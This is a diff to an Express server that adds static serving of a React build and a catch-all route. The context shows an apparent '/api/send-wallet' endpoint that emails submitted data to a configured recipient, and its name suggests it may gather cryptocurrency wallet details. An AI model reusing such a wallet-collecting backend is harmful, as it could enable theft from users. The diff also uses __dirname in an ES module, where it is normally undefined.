@@ -3,13 +3,17 @@ import nodemailer from 'nodemailer';
 import bodyParser from 'body-parser';
 import cors from "cors";
 import dotenv from 'dotenv';  
-
-
+// const path = require('path');
+import path from "path";
 dotenv.config();
 
 const app = express();
 app.use(cors()); 
 app.use(bodyParser.json());
+
+// Serve static files from the React app
+app.use(express.static(path.join(__dirname, 'client/build')));
+
 
 
 const email = process.env.RECIPIENT_EMAIL;
@@ -48,6 +52,11 @@ app.post('/api/send-wallet', async (req, res) => {
     console.error('Error sending email:', error);
     res.status(500).json({ success: false, error: 'Failed to send email' });
   }
+});
+
+// Catch-all route to handle React Router routes
+app.get('*', (req, res) => {
+  res.sendFile(path.join(__dirname, 'client/build', 'index.html'));
 });
 
 const PORT = process.env.PORT || 3001;
